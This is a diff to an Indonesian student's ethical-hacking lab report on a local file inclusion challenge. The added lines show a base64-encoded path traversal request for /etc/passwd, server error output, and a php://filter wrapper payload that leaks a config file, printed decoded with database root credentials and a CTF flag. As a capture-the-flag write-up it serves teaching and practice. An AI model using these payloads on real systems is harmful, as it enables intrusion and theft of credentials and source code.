@@ -1,6 +1,6 @@
 <h1>Laporan Praktikum Ethical Hacking</h1>
 <p><strong>Nama:</strong> Jofanka Al-Kautsar Pangestu Abady</p>
-<p><strong>NRP:</strong> 50237241107</p>
+<p><strong>NRP:</strong> 5027241107</p>
 <p><strong>Tanggal:</strong> Sabtu, 6 Desember 2025</p>
 
 
@@ -76,7 +76,7 @@ Score: 7.5 (High)
   
   <li>
     <p>
-      <strong>Percobaan Eksploitasi (Thought Process):</strong> Saya mencoba melakukan modifikasi pada hasil Burp Suite tadi, dengan mengubah <code>GET /?page=cGFnZXMvZ2VtcmFkYWs= HTTP/1.1</code> menjadi <code>Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==</code> di mana <code>Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==</code> adalah hasil decode dari <code>../../../../etc/passwd</code>.
+      <strong>Percobaan Eksploitasi (Thought Process):</strong> Saya mencoba melakukan modifikasi pada hasil Burp Suite tadi, dengan mengubah <pre>GET /?page=cGFnZXMvZ2VtcmFkYWs= HTTP/1.1</pre> menjadi <pre>GET /?page=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==</pre> di mana <code>Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==</code> adalah hasil eecode dari <code>../../../../etc/passwd</code>.
     </p>
       <pre>
 HTTP/1.1 200 OK
@@ -93,42 +93,51 @@ Content-Type: text/html; charset=UTF-8
 <b>Warning</b>:  include(../../../../etc/passwd.php): Failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>3</b><br />
 <br />
 <b>Warning</b>:  include(): Failed opening '../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>3</b><br />
+</pre>
 
-    </pre>
+<p>Lalu, kita coba dengan payload yang lain, misalnya <code>php://filter/convert.base64-encode/resource=config</code>, lalu diencode menjadi <code>cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1jb25maWc=</code>. Untuk hasilnya seperti ini.</p>
+<pre>
+HTTP/1.1 200 OK
+Date: Fri, 05 Dec 2025 23:17:23 GMT
+Server: Apache/2.4.65 (Debian)
+X-Powered-By: PHP/8.3.28
+Vary: Accept-Encoding
+Content-Length: 428
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+PD9waHAKLy8gRGF0YWJhc2UgQ29uZmlndXJhdGlvbgokZGJfaG9zdCA9ICdsb2NhbGhvc3QnOwokZGJfcG9ydCA9ICczMzA2JzsKJGRiX3VzZXIgPSAncm9vdCc7CiRkYl9wYXNzID0gJ2luZ2FoaW5naWhwZXRpbmdzaW5nJzsKJGRiX25hbWUgPSAnbWFramVnYWdpayc7Cgokc2VjcmV0X2tleSA9ICdFVEhBQ0t7a3VyYW5naV9rZWNlcGF0YW5fZ3VuYWthbl9oZWxtfSc7CgppZiAoYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pID09PSBiYXNlbmFtZShfX0ZJTEVfXykpIHsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicpOwogICAgCn0KPz4=
+</pre>
+  <p>
+    Dimana, pada hasil <code>base64</code> tersebvut jika di-decode maka akan muncul seperti ini.
+  </p>
+  <pre>
+    <?php
+    
+    $db_host = 'localhost';
+        $db_port = '3306';
+        $db_user = 'root';
+        $db_pass = 'ingahingihpetingsing';
+        $db_name = 'makjegagik';
+      
+      $secret_key = 'ETHACK{kurangi_kecepatan_gunakan_helm}';
+      
+      if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
+          header('HTTP/1.0 403 Forbidden');
+          
+      }
+      ?>
+  </pre>
+
+  Berdasarkan hasil di atas, dapat ditemukan bahwa flagnya adalah
+  <pre>
+    ETHACK{kurangi_kecepatan_gunakan_helm}
+  </pre>
+  .
   </li>
   
-  <li>
-    <p>
-      <strong>Bypass Menggunakan PHP Wrapper:</strong> Karena ekstensi <code>.php</code> dipaksa, saya menggunakan wrapper <code>php://filter</code> untuk membaca source code file <code>config.php</code> dalam bentuk Base64 agar tidak dieksekusi server.
-    </p>
-    <p>
-      <strong>Payload:</strong> <code>php://filter/convert.base64-encode/resource=config</code>
-      
-<strong>Base64 Encoded Payload (untuk URL):</strong> 
 
-<code>cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1jb25maWc=</code>
-</p>
-<blockquote>
-  <p>
-    <em>
-      [MASUKKAN SCREENSHOT REPEATER DENGAN PAYLOAD DI ATAS]
-    </em>
-  </p>
-</blockquote>
-</li>
-
-<li> 
-  <p>
-    <strong>Decoding Hasil:</strong>Respon dari server berupa string Base64 panjang. Setelah di-decode, ditemukan kredensial database dan Flag.
-  </p>
-<blockquote>
-  <p>
-    <em>
-      [MASUKKAN SCREENSHOT HASIL DECODE CONFIG.PHP YANG ADA FLAGNYA]
-    </em>
-  </p>
-</blockquote>
-</li>
 </ol>
 
 <!-- ----------- 1e. Dampak ----------- -->
